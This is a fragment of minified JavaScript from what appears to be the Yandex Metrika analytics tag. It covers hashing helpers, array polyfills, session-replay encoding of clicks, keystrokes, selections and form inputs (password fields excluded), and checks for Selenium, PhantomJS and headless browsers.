            return ca(t, "" + e + n + o, r || i, a), this;
          },
          l: function (n) {
            return Tr(t, "" + e + n + o);
          },
          o: function (n, r, a, u, c) {
            return kr(t, "" + e + n + o, r, a, u || i, c), this;
          },
        };
      }
      function fa(t, e) {
        var n = Tf(t);
        return n
          ? ((n.href = e),
            {
              protocol: n.protocol,
              host: n.host,
              port: n.port,
              hostname: n.hostname,
              hash: n.hash,
              search: n.search,
              query: n.search.replace(/^\?/, ""),
              pathname: n.pathname || "/",
              path: (n.pathname || "/") + n.search,
              href: n.href,
            })
          : {};
      }
      function ha(t, e) {
        (t = [t[0] >>> 16, 65535 & t[0], t[1] >>> 16, 65535 & t[1]]),
          (e = [e[0] >>> 16, 65535 & e[0], e[1] >>> 16, 65535 & e[1]]);
        var n = [0, 0, 0, 0];
        return (
          (n[3] += t[3] * e[3]),
          (n[2] += n[3] >>> 16),
          (n[3] &= 65535),
          (n[2] += t[2] * e[3]),
          (n[1] += n[2] >>> 16),
          (n[2] &= 65535),
          (n[2] += t[3] * e[2]),
          (n[1] += n[2] >>> 16),
          (n[2] &= 65535),
          (n[1] += t[1] * e[3]),
          (n[0] += n[1] >>> 16),
          (n[1] &= 65535),
          (n[1] += t[2] * e[2]),
          (n[0] += n[1] >>> 16),
          (n[1] &= 65535),
          (n[1] += t[3] * e[1]),
          (n[0] += n[1] >>> 16),
          (n[1] &= 65535),
          (n[0] += t[0] * e[3] + t[1] * e[2] + t[2] * e[1] + t[3] * e[0]),
          (n[0] &= 65535),
          [(n[0] << 16) | n[1], (n[2] << 16) | n[3]]
        );
      }
      function la(t, e) {
        (t = [t[0] >>> 16, 65535 & t[0], t[1] >>> 16, 65535 & t[1]]),
          (e = [e[0] >>> 16, 65535 & e[0], e[1] >>> 16, 65535 & e[1]]);
        var n = [0, 0, 0, 0];
        return (
          (n[3] += t[3] + e[3]),
          (n[2] += n[3] >>> 16),
          (n[3] &= 65535),
          (n[2] += t[2] + e[2]),
          (n[1] += n[2] >>> 16),
          (n[2] &= 65535),
          (n[1] += t[1] + e[1]),
          (n[0] += n[1] >>> 16),
          (n[1] &= 65535),
          (n[0] += t[0] + e[0]),
          (n[0] &= 65535),
          [(n[0] << 16) | n[1], (n[2] << 16) | n[3]]
        );
      }
      function da(t, e) {
        return 32 === (e %= 64)
          ? [t[1], t[0]]
          : 32 > e
          ? [
              (t[0] << e) | (t[1] >>> (32 - e)),
              (t[1] << e) | (t[0] >>> (32 - e)),
            ]
          : ((e -= 32),
            [
              (t[1] << e) | (t[0] >>> (32 - e)),
              (t[0] << e) | (t[1] >>> (32 - e)),
            ]);
      }
      function pa(t, e) {
        return 0 === (e %= 64)
          ? t
          : 32 > e
          ? [(t[0] << e) | (t[1] >>> (32 - e)), t[1] << e]
          : [t[1] << (e - 32), 0];
      }
      function va(t, e) {
        return [t[0] ^ e[0], t[1] ^ e[1]];
      }
      function ma(t) {
        return (
          (t = va(t, [0, t[0] >>> 1])),
          (t = va((t = ha(t, [4283543511, 3981806797])), [0, t[0] >>> 1])),
          va((t = ha(t, [3301882366, 444984403])), [0, t[0] >>> 1])
        );
      }
      function ga(t, e) {
        void 0 === e && (e = 210);
        var n = t || "",
          r = e || 0,
          i = n.length - (n.length % 16);
        r = { R: [0, r], T: [0, r] };
        for (var o = 0; o < i; o += 16) {
          var a = r,
            u = [
              (255 & t.charCodeAt(o + 4)) |
                ((255 & t.charCodeAt(o + 5)) << 8) |
                ((255 & t.charCodeAt(o + 6)) << 16) |
                ((255 & t.charCodeAt(o + 7)) << 24),
              (255 & t.charCodeAt(o)) |
                ((255 & t.charCodeAt(o + 1)) << 8) |
                ((255 & t.charCodeAt(o + 2)) << 16) |
                ((255 & t.charCodeAt(o + 3)) << 24),
            ],
            c = [
              (255 & t.charCodeAt(o + 12)) |
                ((255 & t.charCodeAt(o + 13)) << 8) |
                ((255 & t.charCodeAt(o + 14)) << 16) |
                ((255 & t.charCodeAt(o + 15)) << 24),
              (255 & t.charCodeAt(o + 8)) |
                ((255 & t.charCodeAt(o + 9)) << 8) |
                ((255 & t.charCodeAt(o + 10)) << 16) |
                ((255 & t.charCodeAt(o + 11)) << 24),
            ];
          (u = ha(u, yh)),
            (u = ha((u = da(u, 31)), wh)),
            (a.R = va(a.R, u)),
            (a.R = da(a.R, 27)),
            (a.R = la(a.R, a.T)),
            (a.R = la(ha(a.R, [0, 5]), [0, 1390208809])),
            (c = ha(c, wh)),
            (c = ha((c = da(c, 33)), yh)),
            (a.T = va(a.T, c)),
            (a.T = da(a.T, 31)),
            (a.T = la(a.T, a.R)),
            (a.T = la(ha(a.T, [0, 5]), [0, 944331445]));
        }
        switch (
          ((i = n.length % 16),
          (o = n.length - i),
          (a = [0, 0]),
          (u = [0, 0]),
          i)
        ) {
          case 15:
            u = va(u, pa([0, n.charCodeAt(o + 14)], 48));
          case 14:
            u = va(u, pa([0, n.charCodeAt(o + 13)], 40));
          case 13:
            u = va(u, pa([0, n.charCodeAt(o + 12)], 32));
          case 12:
            u = va(u, pa([0, n.charCodeAt(o + 11)], 24));
          case 11:
            u = va(u, pa([0, n.charCodeAt(o + 10)], 16));
          case 10:
            u = va(u, pa([0, n.charCodeAt(o + 9)], 8));
          case 9:
            (u = ha((u = va(u, [0, n.charCodeAt(o + 8)])), wh)),
              (u = ha((u = da(u, 33)), yh)),
              (r.T = va(r.T, u));
          case 8:
            a = va(a, pa([0, n.charCodeAt(o + 7)], 56));
          case 7:
            a = va(a, pa([0, n.charCodeAt(o + 6)], 48));
          case 6:
            a = va(a, pa([0, n.charCodeAt(o + 5)], 40));
          case 5:
            a = va(a, pa([0, n.charCodeAt(o + 4)], 32));
          case 4:
            a = va(a, pa([0, n.charCodeAt(o + 3)], 24));
          case 3:
            a = va(a, pa([0, n.charCodeAt(o + 2)], 16));
          case 2:
            a = va(a, pa([0, n.charCodeAt(o + 1)], 8));
          case 1:
            (a = ha((a = va(a, [0, n.charCodeAt(o)])), yh)),
              (a = ha((a = da(a, 31)), wh)),
              (r.R = va(r.R, a));
        }
        return (
          (r.R = va(r.R, [0, n.length])),
          (r.T = va(r.T, [0, n.length])),
          (r.R = la(r.R, r.T)),
          (r.T = la(r.T, r.R)),
          (r.R = ma(r.R)),
          (r.T = ma(r.T)),
          (r.R = la(r.R, r.T)),
          (r.T = la(r.T, r.R)),
          ("00000000" + (r.R[0] >>> 0).toString(16)).slice(-8) +
            ("00000000" + (r.R[1] >>> 0).toString(16)).slice(-8) +
            ("00000000" + (r.T[0] >>> 0).toString(16)).slice(-8) +
            ("00000000" + (r.T[1] >>> 0).toString(16)).slice(-8)
        );
      }
      function ba(t, e, n) {
        var r = e.getAttribute("itemtype");
        return (
          (n = ci('[itemprop~="' + n + '"]', e)),
          r
            ? Lu(function (n) {
                return n.parentNode && mi("[itemtype]", t, n.parentNode) === e;
              }, n)
            : n
        );
      }
      function ya(t, e, n) {
        return (t = ba(t, e, n)) && t.length ? t[0] : null;
      }
      function wa(t) {
        return (
          (t &&
            (t = lo(t) ? t : [t]).length &&
            (t[0].getAttribute("content") || t[0].innerText)) ||
          ""
        );
      }
      function Ea(t) {
        return t
          ? t.attributes && t.getAttribute("datetime")
            ? t.getAttribute("datetime")
            : wa(t)
          : "";
      }
      function xa(t) {
        return (t = Xi(t).hash.split("#")[1]) ? t.split("?")[0] : "";
      }
      function Ca(t, e) {
        var n = xa(t);
        return (
          (Zl = (function (t, e, n, r) {
            return t.setInterval(Ur(t, "i.err." + (r || "def"), e), n);
          })(
            t,
            function () {
              var r = xa(t);
              r !== n && (e(), (n = r));
            },
            200,
            "t.h"
          )),
          yu(jr, null, t, Zl)
        );
      }
      function Aa(t, e, n) {
        var r,
          i,
          o = e.aa,
          a = e.Pe,
          u = e.qc,
          c = Pu(t),
          s = Uc((((r = {}).wh = "1"), (r.pv = "1"), r));
        Gc(o) && t.Ug && t.Ug.Yj && s.o("ad", "1"),
          a && s.o("ut", "1"),
          (o = c.l("lastReferrer")),
          (r = Xi(t).href),
          n(
            (u = {
              F: ((i = {}), (i["page-url"] = u || r), (i["page-ref"] = o), i),
              H: s,
            }),
            e
          ).catch(Ur(t, "g.s")),
          c.o("lastReferrer", r);
      }
      function _a(t, e) {
        var n,
          r = Si(e),
          i = Pc.$b,
          o = co(t);
        if (r && Ti("ym-advanced-informer", r)) {
          var a = o.l("ifc", 0) + 1;
          o.o("ifc", a), (a = r.getAttribute("data-lang"));
          var u = ec(r.getAttribute("data-cid") || "");
          (u || 0 === u) &&
            ((i = mo(t, "Ya." + i + ".informer"))
              ? i((((n = {}).i = r), (n.id = u), (n.lang = a), n))
              : o.o("ib", !0),
            (n = e || window.event).preventDefault
              ? n.preventDefault()
              : (n.returnValue = !1));
        }
      }
      function ka(t, e, n) {
        return (
          (t =
            e &&
            (Ro(e.className, "ym-disable-keys") ||
              Ro(e.className, "-metrika-nokeys"))),
          n && e
            ? t ||
              !!(function (t, e) {
                var n = lo(t) ? t : [t];
                if ((e = e || document).querySelectorAll) {
                  var r = iu(
                    ", ",
                    Vu(function (t) {
                      return "." + t;
                    }, n)
                  );
                  return Zi(e.querySelectorAll(r));
                }
                return e.getElementsByClassName
                  ? Yu(po(yo("getElementsByClassName", e), Zi), n)
                  : ((r = e.getElementsByTagName("*")),
                    (n = "(" + iu("|", n) + ")"),
                    Lu(wo(n, Ti), Zi(r)));
              })(["ym-disable-keys", "-metrika-nokeys"], e).length
            : t
        );
      }
      function Ta(t, e) {
        return (
          !!Cs(e) &&
          ("password" === e.type ||
            (e.name && Fu(e.name.toLowerCase(), Zd)) ||
            (e.id && Fu(e.id.toLowerCase(), Zd)))
        );
      }
      function Sa(t, e) {
        var n = Math.max(0, Math.min(e, 65535));
        Ji(t, [n >> 8, 255 & n]);
      }
      function Ra(t, e) {
        Ji(t, [255 & e]);
      }
      function Ma(t, e, n) {
        return -1 === jo(t)(n, ep) || (Ra(e, n), !1);
      }
      function Na(t, e) {
        for (var n = Math.max(0, 0 | e); 127 < n; )
          Ji(t, [(127 & n) | 128]), (n >>= 7);
        Ji(t, [n]);
      }
      function Da(t, e) {
        Na(t, e.length);
        for (var n = 0; n < e.length; n += 1) Na(t, e.charCodeAt(n));
      }
      function Pa(t, e) {
        var n = e;
        255 < n.length && (n = n.substr(0, 255)), t.push(n.length);
        for (var r = 0; r < n.length; r += 1) Sa(t, n.charCodeAt(r));
      }
      function Ia(t, e, n) {
        void 0 === n && (n = []);
        for (var r = []; e && !gt(t, e, n); e = li(t, e)) r.push(e);
        return (
          zu(function (e) {
            Ud.sd += 1;
            var r = Ud.sd;
            (e[Hd] = r),
              (Ud[r] = {}),
              (r = (function (t, e) {
                var n = bi(e);
                if (!n) return (e[Hd] = -1), null;
                var r = +e[Hd];
                if (!isFinite(r) || 0 >= r) return null;
                if (e.attributes)
                  for (var i = e; i; ) {
                    if (i.attributes.ek) return null;
                    i = i.parentElement;
                  }
                i = 64;
                var o = li(t, e),
                  a = o && o[Hd] ? o[Hd] : 0;
                0 > a && (a = 0), (n = (n || "").toUpperCase());
                var u = tp()[n];
                u || (i |= 2);
                var c = hi(t, e);
                c || (i |= 4);
                var s = di(t, e);
                return (
                  (o = o ? di(t, o) : null) &&
                    s[0] === o[0] &&
                    s[1] === o[1] &&
                    s[2] === o[2] &&
                    s[3] === o[3] &&
                    (i |= 8),
                  (Ud[r].Wf = s[0] + "x" + s[1]),
                  (Ud[r].size = s[2] + "x" + s[3]),
                  e.id && "string" == typeof e.id && (i |= 32),
                  Ma(t, (o = []), 1)
                    ? null
                    : (Na(o, r),
                      Ra(o, i),
                      Na(o, a),
                      u ? Ra(o, u) : Pa(o, n),
                      c && Na(o, c),
                      8 & i ||
                        (Na(o, s[0]), Na(o, s[1]), Na(o, s[2]), Na(o, s[3])),
                      32 & i && Pa(o, e.id),
                      Ra(o, 0),
                      o)
                );
              })(t, e)),
              (e = (function (t, e) {
                var n = e[Hd];
                if (!n || 0 > n || !Ts(e) || !e.form || Ct(0, e.form))
                  return [];
                var r = yi(t, e.form);
                if (0 > r) return [];
                if (Cs(e)) {
                  var i = {
                    text: 0,
                    color: 0,
                    hc: 0,
                    lk: 0,
                    "datetime-local": 0,
                    email: 0,
                    Tf: 0,
                    Gk: 0,
                    search: 0,
                    Jk: 0,
                    time: 0,
                    url: 0,
                    month: 0,
                    Lk: 0,
                    password: 2,
                    Fk: 3,
                    hk: 4,
                    file: 6,
                    image: 7,
                  };
                  i = i[e.type];
                } else {
                  i = { bk: 1, ck: 5 };
                  var o = bi(e);
                  i = gu(o) ? "" : i[o];
                }
                if ("number" != typeof i) return [];
                o = -1;
                for (
                  var a = e.form.elements, u = a.length, c = 0, s = 0;
                  c < u;
                  c += 1
                )
                  if (a[c].name === e.name) {
                    if (a[c] === e) {
                      o = s;
                      break;
                    }
                    s += 1;
                  }
                return 0 > o || Ma(t, (a = []), 7)
                  ? []
                  : (Na(a, n),
                    Na(a, r),
                    Na(a, i),
                    Da(a, e.name || ""),
                    Na(a, o),
                    a);
              })(t, e)),
              r && e && (Ji(n, r), Ji(n, e));
          }, Qu(r)),
          n
        );
      }
      function Oa(t) {
        var e = t.ia;
        if (!ip || (e && !e.fromElement)) return mt(t);
      }
      function La(t) {
        var e = t.ia;
        if (e && !e.toElement) return vt(t);
      }
      function ja(t) {
        var e = Si(t.ia);
        if (e && Ss(e)) {
          var n = pt(t, e),
            r = dr(t.b),
            i = [];
          return (
            Ma(t.b, i, 17) ? (t = []) : (Na(i, r), Na(i, e[Hd]), (t = i)),
            $o(n, t)
          );
        }
      }
      function Ba(t) {
        var e = t.b,
          n = t.ia.target;
        if (n && Ss(n)) {
          e = Ia(e, n);
          var r = dr(t.b),
            i = [];
          return (
            Ma(t.b, i, 18) ? (t = []) : (Na(i, r), Na(i, n[Hd]), (t = i)),
            $o(e, t)
          );
        }
      }
      function Fa(t) {
        var e = t.b,
          n = Si(t.ia);
        if (!n || Ta(0, n) || ka(e, n)) return [];
        if (Ts(n)) {
          var r = Pu(e).l("isEU"),
            i = bt(e, n, r),
            o = i.jb;
          if (((r = i.Rd), (i = i.Cd), ks(n))) var a = n.checked;
          else (a = n.value), (a = o ? iu("", rp(a.split(""))) : a);
          return (
            (e = Ia(e, n)),
            (o = dr(t.b)),
            (r = r && !i),
            (i = []),
            Ma(t.b, i, 39)
              ? (t = [])
              : (Na(i, o),
                Na(i, n[Hd]),
                Pa(i, String(a)),
                Ra(i, r ? 1 : 0),
                (t = i)),
            $o(e, t)
          );
        }
      }
      function Ga(t) {
        var e = t.b,
          n = t.ia,
          r = Si(n);
        if (!r || "SCROLLBAR" === r.nodeName) return [];
        var i = [],
          o = wo(i, Ji);
        r && Ss(r) ? o(pt(t, r)) : o(Ia(e, r));
        var a = St(e, n);
        (t = dr(t.b)), (o = n.type);
        var u,
          c = [a.x, a.y];
        (a = n.which), (n = n.button);
        var s = pi(e, r),
          f = s[0];
        for (s = s[1]; r && (!f || !s); )
          (r = li(e, r)) && ((f = (s = pi(e, r))[0]), (s = s[1]));
        return (
          r
            ? !(f = r[Hd]) || 0 > f
              ? (e = [])
              : (s = ((u = {}),
                (u.mousemove = 2),
                (u.click = 32),
                (u.dblclick = 33),
                (u.mousedown = 4),
                (u.mouseup = 30),
                (u.touch = 12),
                u)[o])
              ? ((u = []),
                (r = vi(e, r)),
                Ma(e, u, s)
                  ? (e = [])
                  : (Na(u, t),
                    Na(u, f),
                    Na(u, Math.max(0, c[0] - r.left)),
                    Na(u, Math.max(0, c[1] - r.top)),
                    /^mouse(up|down)|click$/.test(o) &&
                      Ra(u, 2 > (e = a || n) ? 1 : e === (a ? 2 : 4) ? 4 : 2),
                    (e = u)))
              : (e = [])
            : (e = []),
          $o(i, e)
        );
      }
      function Ha(t) {
        return $o(
          Ga(t),
          (function (t) {
            var e = null,
              n = t.b,
              r = n.document;
            if (n.getSelection) {
              r = void 0;
              try {
                r = n.getSelection();
              } catch (t) {
                return [];
              }
              if (mu(r)) return [];
              var i = "" + r;
              e = r.anchorNode;
            } else
              r.selection &&
                r.selection.createRange &&
                ((i = (r = r.selection.createRange()).text),
                (e = r.parentElement()));
            if ("string" != typeof i) return [];
            try {
              for (; e && 1 !== e.nodeType; ) e = e.parentNode;
            } catch (t) {
              return [];
            }
            if (!e) return [];
            (r = bt(n, e).jb || ka(n, e, !0)),
              (e = e.getElementsByTagName("*"));
            for (var o = 0; o < e.length && !r; )
              (r = bt(n, (r = e[o])).jb || ka(n, r, !0)), (o += 1);
            return i !== op
              ? ((op = i),
                (r = r ? iu("", rp(i.split(""))) : i),
                (i = dr(t.b)),
                0 === r.length
                  ? (r = n = "")
                  : 100 >= r.length
                  ? ((n = r), (r = ""))
                  : 200 >= r.length
                  ? ((n = r.substr(0, 100)), (r = r.substr(100)))
                  : ((n = r.substr(0, 97)), (r = r.substr(r.length - 97))),
                (e = []),
                Ma(t.b, e, 29)
                  ? (t = [])
                  : (Na(e, i), Da(e, n), Da(e, r), (t = e)),
                t)
              : void 0;
          })(t) || []
        );
      }
      function Ua(t) {
        return (
          (t.shiftKey ? 2 : 0) |
          (t.ctrlKey ? 4 : 0) |
          (t.altKey ? 1 : 0) |
          (t.metaKey ? 8 : 0) |
          (t.ctrlKey || t.altKey ? 16 : 0)
        );
      }
      function Xa(t) {
        var e = [];
        return (
          ap ||
            ((ap = !0),
            op &&
              e.push.apply(
                e,
                (function (t, e) {
                  var n = [];
                  return Ma(t, n, 27) ? [] : (Na(n, e), n);
                })(t.b, dr(t.b))
              ),
            qn(
              t.b,
              function () {
                ap = !1;
              },
              "fv.c"
            )),
          e
        );
      }
      function Va(t, e, n, r) {
        var i = Si(e);
        if (!i || yt(t, i)) return [];
        var o = At(i),
          a = wt(i);
        e = bt(t, i).jb;
        var u = Pu(t);
        return (
          !o && ((a && u.l("isEU")) || ka(t, i))
            ? (t = [])
            : ((o = Ia(t, i)),
              (u = dr(t)),
              Ma(t, (a = []), 38)
                ? (t = [])
                : (Na(a, u),
                  Sa(a, n),
                  Ra(a, r),
                  (!(t = i[Hd]) || 0 > t) && (t = 0),
                  Na(a, t),
                  Ra(a, e ? 1 : 0),
                  (t = a)),
              (t = $o(o, t))),
          t
        );
      }
      function za(t) {
        var e = t.b,
          n = t.ia,
          r = n.keyCode,
          i = Ua(n),
          o = [],
          a = wo(o, Ji);
        return (
          ({
            3: 1,
            8: 1,
            9: 1,
            13: 1,
            16: 1,
            17: 1,
            18: 1,
            19: 1,
            20: 1,
            27: 1,
            33: 1,
            34: 1,
            35: 1,
            36: 1,
            37: 1,
            38: 1,
            39: 1,
            40: 1,
            45: 1,
            46: 1,
            91: 1,
            92: 1,
            93: 1,
            106: 1,
            110: 1,
            111: 1,
            144: 1,
            145: 1,
          }[r] ||
            (112 <= r && 123 >= r) ||
            (96 <= r && 105 >= r) ||
            16 & i) &&
            (19 === r && 4 == (-17 & i) && (r = 144),
            a(Va(e, n, r, 16 | i)),
            (up = !1),
            qn(
              e,
              function () {
                up = !0;
              },
              "fv.kd"
            ),
            !(67 === r && 4 & i) || 1 & i || 2 & i || a(Xa(t))),
          o
        );
      }
      function Ya(t) {
        var e = t.b;
        t = t.ia;
        var n = [];
        return (
          up &&
            !cp &&
            0 !== t.which &&
            (n.push.apply(n, Va(e, t, t.charCode || t.keyCode, Ua(t))),
            (cp = !0),
            qn(
              e,
              function () {
                cp = !1;
              },
              "fv.kp"
            )),
          n
        );
      }
      function qa(t) {
        var e = t.b,
          n = Si(t.ia);
        if (!n || Ct(0, n)) return [];
        var r = [];
        if ("FORM" === n.nodeName) {
          for (var i = n.elements, o = 0; o < i.length; o += 1)
            gi(i[o]) || r.push.apply(r, Ia(e, i[o]));
          r.push.apply(
            r,
            (function (t, e, n) {
              var r = yi(t, n);
              if (0 > r) return [];
              var i = n.elements,
                o = i.length;
              n = [];
              for (var a = 0; a < o; a += 1)
                if (!gi(i[a])) {
                  var u = i[a][Hd];
                  u && 0 < u && n.push(u);
                }
              if (Ma(t, (i = []), 11)) return [];
              for (
                Na(i, e), Na(i, r), Na(i, n.length), t = 0;
                t < n.length;
                t += 1
              )
                Na(i, n[t]);
              return i;
            })(e, dr(t.b), n)
          );
        }
        return r;
      }
      function Ka(t) {
        var e = t.flush;
        "BODY" === bi((t = Si(t.ia))) && e();
      }
      function Wa(t, e, n, r) {
        return function () {
          var n = vn(t, e),
            i = Oo(arguments);
          if (n) return r.apply(void 0, i);
        };
      }
      function Ja(t, e, n, r) {
        var i = If[n];
        return i
          ? function () {
              var e = Oo(arguments);
              try {
                var n = r.apply(void 0, e),
                  o = Pu(t);
                o.Fa("mt", {});
                var a = o.l("mt"),
                  u = a[i];
                a[i] = u ? u + 1 : 1;
              } catch (t) {
                eo(t);
              }
              return n;
            }
          : r;
      }
      function $a(t, e, n, r) {
        return function () {
          var n = vn(t, e),
            i = Oo(arguments);
          return r.apply(void 0, i), n;
        };
      }
      function Za(t, e, n, r) {
        return Ur(t, "cm." + n, r);
      }
      var Qa,
        tu,
        eu = {
          construct: "Metrika2",
          callbackPostfix: "2",
          version: "nw88wxnri2h7xtkmzit4",
        },
        nu = [],
        ru = Vo(Array.prototype.join, "join"),
        iu = ru
          ? function (t, e) {
              return ru.call(e, t);
            }
          : function (t, e) {
              for (var n = "", r = 0; r < e.length; r += 1)
                n += "" + (r ? t : "") + e[r];
              return n;
            },
        ou = Xo(function (t, e) {
          return t === e;
        }),
        au = Xo(function (t, e) {
          return t(e), e;
        }),
        uu = Xo(iu),
        cu = Xo(Ko),
        su = jo(window),
        fu = Uo(su),
        hu = Vo(Array.from, "from"),
        lu = /\./g,
        du = Vo(String.prototype.indexOf, "indexOf"),
        pu = /^\s+|\s+$/g,
        vu = Vo(String.prototype.trim, "trim"),
        mu = ou(null),
        gu = ou(void 0),
        bu = Vo(Function.prototype.bind, "bind"),
        yu = bu
          ? function () {
              var t = Oo(arguments);
              return bu.apply(t[0], $o([t[1]], t.slice(2)));
            }
          : function () {
              var t = Oo(arguments),
                e = t[0],
                n = t[1],
                r = t.slice(2);
              return function () {
                var t = $o(r, Oo(arguments));
                if (Function.prototype.call)
                  return Function.prototype.call.apply(e, $o([n], t));
                if (n) {
                  for (var i = "_b"; n[i]; ) i += "_" + i.length;
                  return (n[i] = e), (t = n[i] && xo(i, t, n)), delete n[i], t;
                }
                return xo(e, t);
              };
            },
        wu = Xo(Eo),
        Eu = Xo(yo),
        xu = Vo(Array.prototype.reduce, "reduce"),
        Cu = xu
          ? function (t, e, n) {
              return xu.call(n, t, e);
            }
          : Co,
        Au = Uo(mo),
        _u = Au("length"),
        ku = po,
        Tu = po(Do, ou("[object Array]")),
        Su = Object.prototype.hasOwnProperty,
        Ru = Object.entries
          ? function (t) {
              return t ? Object.entries(t) : [];
            }
          : function (t) {
              return gu(t)
                ? []
                : Co(
                    function (e, n) {
                      return e.push([n, t[n]]), e;
                    },
                    [],
                    so(t)
                  );
            },
        Mu = Object.keys ? Object.keys : so,
        Nu =
          Object.assign ||
          function () {
            var t = Oo(arguments),
              e = t[0];
            for (t = t.slice(1); t.length; ) {
              var n,
                r = t.shift();
              for (n in r) ho(r, n) && (e[n] = r[n]);
              ho(r, "toString") && (e.toString = r.toString);
            }
            return e;
          },
        Du = Xo(function (t, e) {
          return Nu({}, t, e);
        }),
        Pu = Io(co),
        Iu = Array.prototype.every
          ? function (t, e) {
              return Array.prototype.every.call(e, t);
            }
          : function (t, e) {
              return Cu(
                function (e, n) {
                  return !!e && t(n);
                },
                !0,
                e
              );
            },
        Ou = Vo(Array.prototype.filter, "filter"),
        Lu = Ou
          ? function (t, e) {
              return Ou.call(e, t);
            }
          : fo,
        ju = Xo(Lu),
        Bu = Qi(
          function (t, e) {
            return Array.prototype.find.call(e, t);
          },
          function (t, e) {
            for (var n = 0; n < e.length; n += 1)
              if (t.call(e, e[n], n)) return e[n];
          },
          zo("find", Array.prototype.find)
        ),
        Fu = Array.prototype.includes
          ? function (t, e) {
              return Array.prototype.includes.call(e, t);
            }
          : function (t, e) {
              return 1 <= fo(ou(t), e).length;
            },
        Gu = Uo(Fu),
        Hu = Io(function (t) {
          t = mo(t, "navigator") || {};
          var e = mo(t, "userAgent") || "";
          return { Hf: -1 < (mo(t, "vendor") || "").indexOf("Apple"), Fg: e };
        }),
        Uu = Io(function (t) {
          var e = mo(t, "document.documentElement.style");
          return (
            (t = mo(t, "InstallTrigger")),
            !(!e || !("MozAppearance" in e) || _o(t))
          );
        }),
        Xu = Vo(Array.prototype.map, "map"),
        Vu =
          Xu &&
          (function (t, e) {
            if (!Uu(t)) return !0;
            try {
              e.call({ 0: !0, length: 1 - Math.pow(2, 32) }, function () {
                throw 1;
              });
            } catch (t) {
              return !1;
            }
            return !0;
          })(window, Array.prototype.map)
            ? function (t, e) {
                return e && 0 < e.length ? Xu.call(e, t) : [];
              }
            : function (t, e) {
                return Co(
                  function (e, n, r) {
                    return e.push(t(n, r)), e;
                  },
                  [],
                  e
                );
              },
        zu = Vu,
        Yu = Array.prototype.flatMap
          ? function (t, e) {
              return Array.prototype.flatMap.call(e, t);
            }
          : function (t, e) {
              return Co(
                function (e, n, r) {
                  return (n = t(n, r)), e.concat(lo(n) ? n : [n]);
                },
                [],
                e
              );
            },
        qu = Xo(Vu),
        Ku = Uo(Vu),
        Wu = Qi(
          function (t, e) {
            return Array.prototype.some.call(e, t);
          },
          function (t, e) {
            for (var n = 0; n < e.length; n += 1)
              if (n in e && t.call(e, e[n], n)) return !0;
            return !1;
          },
          zo("some", Array.prototype.some)
        ),
        Ju = Io(jo),
        $u = Xo($i),
        Zu = Vo(Array.prototype.reverse, "reverse"),
        Qu = Zu
          ? function (t) {
              return Zu.call(t);
            }
          : function (t) {
              for (var e = [], n = t.length - 1; 0 <= n; --n)
                e[t.length - 1 - n] = t[n];
              return e;
            },
        tc = Uo(parseInt),
        ec = tc(10),
        nc = tc(2),
        rc = Io(po(Au("String.fromCharCode"), wo("fromCharCode", zo), Fo)),
        ic = Io(Au("navigator.userAgent")),
        oc = Io(po(ic, bo(/ipad|iphone|ipod/i))),
        ac = Io(function (t) {
          return mo(t, "navigator.platform") || "";
        }),
        uc = "FB_IAB FBAV OKApp GSA/ yandex yango uber EatsKit YKeyboard".split(
          " "
        ),
        cc = Io(function (t) {
          var e = Hu(t);
          t = e.Hf;
          var n = yo("indexOf", (e = e.Fg));
          n = Wu(po(n, ou(-1), Fo), uc);
          return (
            t &&
            ((!/Safari/.test(e) && /Mobile/.test(e)) ||
              /YaBrowser\/[\d.]+\sSA\/3|CFNetwork\/[0-9][0-9.]*.*Darwin\/[0-9][0-9.]*/.test(
                e
              ) ||
              n)
          );
        }),
        sc = Io(function (t) {
          var e = (t = Hu(t)).Fg;
          return t.Hf && !e.match("CriOS");
        }),
        fc = bo(
          /Android.*Version\/[0-9][0-9.]*\sChrome\/[0-9][0-9.]|Android.*Version\/[0-9][0-9.]*\s(?:Mobile\s)?Safari\/[0-9][0-9.]*\sChrome\/[0-9][0-9.]*|; wv\).*Chrome\/[0-9][0-9.]*\sMobile/
        ),
        hc = bo(/; wv\)/),
        lc = Io(function (t) {
          return (t = ic(t)), hc(t) || fc(t);
        }),
        dc = /Chrome\/(\d+)\./,
        pc = Io(function (t) {
          return (
            !(
              !(t = (mo(t, "navigator.userAgent") || "").match(dc)) || !t.length
            ) && 76 <= ec(t[1])
          );
        }),
        vc = Io(function (t) {
          var e = (ic(t) || "").toLowerCase();
          return (
            (t = ac(t)),
            !(
              -1 === e.indexOf("android") ||
              -1 === e.indexOf(e, "mobile") ||
              !/^android|linux armv/i.test(t)
            )
          );
        }),
        mc =
          "other none unknown wifi ethernet bluetooth cellular wimax mixed".split(
            " "
          ),
        gc = Io(function (t) {
          var e = mo(t, "navigator.connection.type");
          return gu(e) ? null : -1 === (t = Ju(t)(e, mc)) ? e : "" + t;
        }),
        bc = Io(po(Au("document.addEventListener"), Fo)),
        yc = Io(function (t) {
          var e = mo(t, "navigator") || {};
          return Cu(
            function (t, n) {
              return t || mo(e, n);
            },
            "",
            ["language", "userLanguage", "browserLanguage", "systemLanguage"]
          );
        }),
        wc = Io(function (t) {
          var e = mo(t, "navigator") || {};
          return (
            No((t = yc(t))) ||
              ((t = ""), No((e = mo(e, "languages.0"))) && (t = e)),
            t.toLowerCase().split("-")[0]
          );
        }),
        Ec = Io(function (t) {
          var e = !1;
          try {
            e = t.top !== t;
          } catch (t) {}
          return e;
        }),
        xc = Io(function (t) {
          var e = !1;
          try {
            e = t.top.contentWindow;
          } catch (t) {}
          return e;
        }),
        Cc = Io(function (t) {
          var e = !1;
          try {
            e = t.navigator.javaEnabled();
          } catch (t) {}
          return e;
        }),
        Ac = Io(function (t) {
          var e =
              "__webdriver_evaluate __selenium_evaluate __webdriver_script_function __webdriver_script_func __webdriver_script_fn __fxdriver_evaluate __driver_unwrapped __webdriver_unwrapped __driver_evaluate __selenium_unwrapped __fxdriver_unwrapped".split(
                " "
              ),
            n = mo(t, "external");
          n =
            -1 !==
            (mo(n, "toString") ? "" + n.toString() : "").indexOf("Sequentum");
          var r = mo(t, "document.documentElement");
          return !!(
            Wu(wo(t, mo), [
              "_selenium",
              "callSelenium",
              "_Selenium_IDE_Recorder",
            ]) ||
            Wu(wo(mo(t, "document"), mo), e) ||
            n ||
            (r &&
              Wu(yu(r.getAttribute, r), ["selenium", "webdriver", "driver"]))
          );
        }),
        _c = Io(function (t) {
          return !!(
            Wu(wo(t, mo), ["_phantom", "__nightmare", "callPhantom"]) ||
            /(PhantomJS)|(HeadlessChrome)/.test(ic(t)) ||
            mo(t, "navigator.webdriver") ||
            (mo(t, "isChrome") && !mo(t, "chrome"))
          );
        }),
        kc = Io(function (t) {
